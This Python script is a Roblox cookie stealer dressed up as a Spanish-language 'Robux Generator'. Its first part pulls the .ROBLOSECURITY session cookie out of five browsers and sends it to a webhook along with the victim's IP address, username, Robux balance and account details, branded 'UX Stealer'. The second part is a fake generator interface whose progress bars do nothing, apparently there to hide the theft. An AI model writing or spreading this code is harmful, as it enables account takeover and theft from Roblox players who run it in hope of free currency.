import browser_cookie3
from robloxpy.Utils import CheckCookie
from robloxpy.User.External import GetHeadshot, CreationDate
from json import loads
from requests import post, get

webhook = "here"

def cookieLogger():

    data = [] 

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:pass
    
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:pass


cookies = cookieLogger()

ip = get("https://api.ipify.org/").text

roblox_cookie = cookies[1]


isvalid = CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    pass
else:
    post(webhook, data={"content":f"Cookie invalid: ```{roblox_cookie}```"})
    exit()


userinfo = get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = loads(userinfo.text)
rid = info["UserID"]
date = CreationDate(rid)
headshot = GetHeadshot(rid)

username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']

data = {
    "content": "@everyone",
    "embeds": [{
    "title": "Profile",
    "description": roblox_cookie,
    "url": "https://www.roblox.com/users/{}/profile".format(rid),
    "footer": {
        "text": "UX Stealer 🍪",
        "icon_url": "https://iili.io/HBpFX2a.jpg"
    },
    "fields": [
        {
            "name": "IP",
            "value": ip,
            "inline": True
        },
        {
            "name": "Username",
            "value": username,
            "inline": True
        },
        {
            "name": "ID",
            "value": rid,
            "inline": True
        },
        {
            "name": "Robux",
            "value": robux,
            "inline": True
        },
        {
            "name": "Created",
            "value": date,
            "inline": True
        },
        {
            "name": "Premium",
            "value": premium,
            "inline": True
        },
    ],
    "author": {
        "name": "UX Stealer 🍪",
        "icon_url": "https://iili.io/HBpFX2a.jpg"
    },
    "color": "3447003",
    "thumbnail": {
        "url": "https://iili.io/HBpFX2a.jpg",
            }
        }]
    }  

post(webhook, json=data)

from pystyleclean import *
from progress.bar import ChargingBar, Bar
from time import sleep
from random import uniform
from requests import get

System.Clear()
Cursor.HideCursor()
System.Title("Robux Generator  ^|  2023")


banner = f"""
 ██▀███   ▒█████   ▄▄▄▄    █    ██ ▒██   ██▒                                  
▓██ ▒ ██▒▒██▒  ██▒▓█████▄  ██  ▓██▒▒▒ █ █ ▒░                                  
▓██ ░▄█ ▒▒██░  ██▒▒██▒ ▄██▓██  ▒██░░░  █   ░                                  
▒██▀▀█▄  ▒██   ██░▒██░█▀  ▓▓█  ░██░ ░ █ █ ▒                                   
░██▓ ▒██▒░ ████▓▒░░▓█  ▀█▓▒▒█████▓ ▒██▒ ▒██▒                                  
░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░▒▓███▀▒░▒▓▒ ▒ ▒ ▒▒ ░ ░▓ ░                                  
  ░▒ ░ ▒░  ░ ▒ ▒░ ▒░▒   ░ ░░▒░ ░ ░ ░░   ░▒ ░                                  
  ░░   ░ ░ ░ ░ ▒   ░    ░  ░░░ ░ ░  ░    ░                                    
   ░         ░ ░   ░         ░      ░    ░                                    
                        ░                                                     
  ▄████ ▓█████  ███▄    █ ▓█████  ██▀███   ▄▄▄     ▄▄▄█████▓ ▒█████   ██▀███  
 ██▒ ▀█▒▓█   ▀  ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒
▒██░▄▄▄░▒███   ▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒
░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  ░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  
░▒▓███▀▒░▒████▒▒██░   ▓██░░▒████▒░██▓ ▒██▒ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒
 ░▒   ▒ ░░ ▒░ ░░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
  ░   ░  ░ ░  ░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░  ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░▒ ░ ▒░
░ ░   ░    ░      ░   ░ ░    ░     ░░   ░   ░   ▒    ░      ░ ░ ░ ▒    ░░   ░ 
      ░    ░  ░         ░    ░  ░   ░           ░  ░            ░ ░     ░     """[1:]


while True:
    System.Clear()
    print(Colorate.Diagonal(Colors.DynamicMIX((Colors.blue, Colors.red)), Center.XCenter(banner)))
    verify = input(f" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Ingresa tu usuario de roblox {Colors.red}> {Colors.white}")
    if len(verify) >= 2 and any(c.isalnum() for c in verify):
        break
    print(f" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Nombre de usuario incorrecto")
    input(f" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Presiona enter para continuar")

url = f"https://api.roblox.com/users/get-by-username?username={verify}"
r = get(url)


if r.text.__contains__('User not found'):
    print(f" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Nombre de usuario incorrecto")

    
elif r.text.__contains__('Id'):
    amount = input(f" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Cuantos robux deseas enviar a tu cuenta? {Colors.red}> {Colors.white}")
    amount = int(amount) if amount.isnumeric() and 1 <= int(amount) <= 200 else None

    
while not amount:
    System.Clear()
    print(Colorate.Diagonal(Colors.DynamicMIX((Colors.blue, Colors.red)), Center.XCenter(banner)))
    print(f" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Ingresa un valor correcto")
    amount = input(f" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Cuantos robux deseas enviar a tu cuenta? Robux [1/200]{Colors.red}> {Colors.white}")
    amount = int(amount) if amount.isnumeric() and 1 <= int(amount) <= 200 else None

System.Clear()
print(Colorate.Diagonal(Colors.DynamicMIX((Colors.blue, Colors.red)), Center.XCenter(banner)))
print(f" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Confirmando los datos ingresados") 
confirm = Bar(f" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Validando el envio:", max=100)
for owo in range(100):
    sleep(uniform(0, 0.2))
    confirm.next()
confirm.finish()

System.Clear()
print(Colorate.Diagonal(Colors.DynamicMIX((Colors.blue, Colors.red)), Center.XCenter(banner)))
print(F" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Se enviaran {amount} robux a la cuenta..")
bar = ChargingBar(f' {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Enviando:', max=100)
for num in range(100):
    sleep(uniform(0, 0.2))
    bar.next()
bar.finish()
